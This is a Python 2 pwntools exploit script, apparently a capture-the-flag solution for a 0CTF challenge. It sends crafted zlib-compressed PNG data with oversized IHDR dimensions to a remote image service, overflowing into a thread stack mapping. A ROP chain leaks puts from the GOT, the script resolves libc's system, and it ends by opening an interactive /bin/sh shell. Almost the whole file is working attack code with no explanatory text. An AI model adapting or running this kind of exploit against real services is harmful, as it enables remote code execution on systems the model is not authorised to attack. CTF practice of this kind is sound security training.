from pwn import *
import zlib

local = False

if local:
	HOST, PORT = '0.0.0.0', 31337
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	HOST, PORT = '202.120.7.216', 12345
	libc = ELF('/=/Downloads/0ctflibc.so.6')
r = remote(HOST, PORT)
menu = lambda: r.recvuntil('6 :)')
ii = lambda x: r.sendline(str(x))

# raw_input('>> ')

menu()
ii(6)
menu()
ii(2)

thread_stack_map_size = 0x801000
map_pad = 0x100000
map_size = map_pad + thread_stack_map_size # guard + stacksize = 0x1000 + 0x800000
a = 0x100
b = 0x1000000
b += map_pad / a
if random.randint(0, 1):
	width, height = a, b
else:
	width, height = b, a
bitdepth = 8
colortype = 2
pngmagic = bytearray([0x89,0x50,0x4e,0x47,0xd,0xa,0x1a,0xa])
with context.local(endian='big'):
	payload = '' + pngmagic + '\x00' * 4
	payload += 'IHDR' + p32(width) + p32(height) + p8(bitdepth) + p8(colortype)

payload = payload.ljust(map_size, '\x01')
payload = str(payload)
payload = payload.encode('zlib')
print payload.count('\x00')

r.send(p32(len(payload)))
r.send(payload)

stack = [p64(0x41414141) for i in range(0x10000 / 8)]

width = 1
height = 1
with context.local(endian='big'):
	payload = '' + pngmagic + '\x00' * 4
	payload += 'IHDR' + p32(width) + p32(height) + p8(bitdepth) + p8(colortype)
payload = payload.ljust(0x1482000, '!')
payload += ''.join(stack)
print payload.count('\x00')

payload = str(payload)
payload = payload.encode('zlib')

assert len(payload) < 0x100000
print len(payload)

for i in range(1):
	menu()
	ii(2)
	r.send(p32(len(payload)))
	r.send(payload)

# trigger!

menu()
ii(4)
ii(0)

width = thread_stack_map_size
height = 1

with context.local(endian='big'):
	payload = '' + pngmagic + '\x00' * 4
	payload += 'IHDR' + p32(width) + p32(height) + p8(bitdepth) + p8(colortype)

stack = [p64(0x4141414141414141+i) for i in range(0xfff0 / 8)]

poprdi = 0x4038b1
poprsir15 = 0x4038af

rop = [
p64(poprdi),
p64(0x60e028),
p64(0x400af0),
p64(poprdi),
p64(1),
p64(0x400c30),
p64(poprdi),
p64(0x60e0b0),
p64(poprsir15),
p64(8),
p64(0),
p64(0x400f14),
p64(poprdi),
p64(50),
p64(0x400c30),
]

stack[0x1de1] = stack[0x1de2] = p64(0x60e800) # nullify lower 3 bytes
stack[0x1de5:len(rop)+0x1de5] = rop
print stack[0x1de5:len(rop)+0x1de5]

payload = payload.ljust(thread_stack_map_size - 0x10000, '\x21')
payload += ''.join(stack)

print payload.count('\x00')

payload = str(payload)
payload = payload.encode('zlib')

assert len(payload) < 0x100000

menu()
ii(2)

r.send(p32(len(payload)))
r.send(payload)

found = False
data = menu()
if '\x7f' in data or '\x7e' in data:
	if '\x7f' in data:
		c = '\x7f'
	else:
		c = '\x7e'
	data = data[data.find(c)-5:data.find(c)+1]
	found = True

if not found:
	r.recvline()
	data = r.recvline()[:-1]

print `data`
data = data.ljust(8, '\x00')
data = u64(data)
libc.address = data - libc.symbols['puts']
print hex(libc.address)
assert libc.address & 0xfff == 0
system = libc.symbols['system']
print hex(system)

time.sleep(2)
r.sendline('.' + p64(system))
r.sendline('   /bin/sh')
r.interactive()